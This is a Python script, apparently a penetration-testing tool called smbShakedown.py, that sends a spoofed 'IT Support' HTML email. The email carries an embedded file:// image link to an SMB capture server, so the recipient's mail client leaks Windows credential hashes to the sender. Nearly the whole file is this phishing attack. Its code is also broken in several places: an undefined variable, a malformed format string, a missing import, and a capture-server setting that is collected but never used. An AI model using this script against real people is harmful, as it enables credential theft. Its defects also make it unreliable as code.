#/usr/bin/python
# Description: A simplified SMB Email Client Attack script used for External/Internal pentests.
# Created by: Nick Sanzotta / @beamr
# Version: smbShakedown.py v 1.0

#To do:
#SMTP Auth option
#MSF Console option(auxiliary/server/capture/smb)
#Multiple recipient address support.
#SMTP local server option
#Fork
import smtplib, getpass, readline, socket, time

def get_ip_address():
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	s.connect(("8.8.8.8", 80))
	return s.getsockname()[0]

def smtpConn(smtpServerAddress, smtpServerPort, smtpUser, smtpPassword, senderAddress, recipients, emailMessage):
	smtpserver = smtplib.SMTP(smtpServerAddress, smtpServerPort)
	smtpserver.ehlo()
	smtpserver.starttls()
	smtpserver.ehlo
	smtpserver.login(smtpUser, smtpPassword)
	print("Testing Connection to your SMTP Server...")
	time.sleep(1)
	try:
		status = smtpserver.noop()[0]
		print("SMTP Server Status: ",status)
		sendOption = raw_input("SMTP server connection is Successful, would you like to send mail now?[yes]:") or 'yes'
		choice = sendOption.lower()
		yes = set(['yes','y', 'ye', ''])
		no = set(['no','n'])
		print('ENTERED: "%s"' % choice + "\n")
		if choice in yes:
			smtpserver.sendmail(senderAddress, recipients, emailMessage)
			print("Successfully sent message(s)!")
			#SMTP close/quit
			smtpserver.quit()
			return True
		elif choice in no:
			print("Ok no mail sent.")
			return False
		else:
			sys.stdout.write("Please respond with 'yes' or 'no'")
	except:
		status = -1
		print("[Aborting]SMTP Server Status: ",status)
	return True if status == 250 else False

def main():
	ipAddress = get_ip_address()
	smtpServerAddress = raw_input('Enter SMTP Server address[smtp.gmail.com]: ') or 'smtp.gmail.com'
	print('ENTERED: "%s"' % smtpServerAddress + "\n")
	smtpServerPort = raw_input('Enter your SMTP Server Port[587]: ') or 587
	print('ENTERED: "%s"' % smtpServerPort + "\n")
	smtpUser = raw_input('Enter SMTP Server username[user@gmail.com]: ') or 'user@gmail.com'
	print('ENTERED: "%s"' % smtpUser + "\n")
	smtpPassword = getpass.getpass(r'Enter SMTP Server password: ')
	print("\n")
	smbCaptureServer = raw_input('Enter SMB Capture Server IP address['+ipAddress+']: ') or  ipAddress
	print('ENTERED:' "%s" % smbCaptureServer + "\n")
	senderName = raw_input('Enter "from name":[IT Support]') or  'IT Support'
	print('ENTERED:' "%s" % senderName + "\n")
	senderAddress = raw_input('Enter "from address":[support@nonexistentdomain.com]') or  'support@nonexistentdomain.com'
	print('ENTERED:' "%s" % senderAddress + "\n")
	recipients = raw_input('Enter recipient(s) name: ')
	print('ENTERED:' "%s" % recipientName + "\n")
	recipients = raw_input('Enter recipient(s) address: ')
	print('ENTERED:' "%s" % recipients + "\n")

	message = """From: {0} <{1}>
To: {2}} <{3}>
MIME-Version: 1.0
Content-type: text/html
Subject: smbShakedown.py test.


...
<b>smbShakedown.py test message.</b>
<br>
<img src=file://{4}/image/foo.gif>
"""
	emailMessage = message.format(senderName, senderAddress, recipientName, recipients, ipAddress)
	print('Email message preview below:')
	time.sleep(1)
	print(emailMessage)
	smtpConn(smtpServerAddress, smtpServerPort, smtpUser, smtpPassword, senderAddress, recipients, emailMessage)

if __name__ == "__main__":
	main()
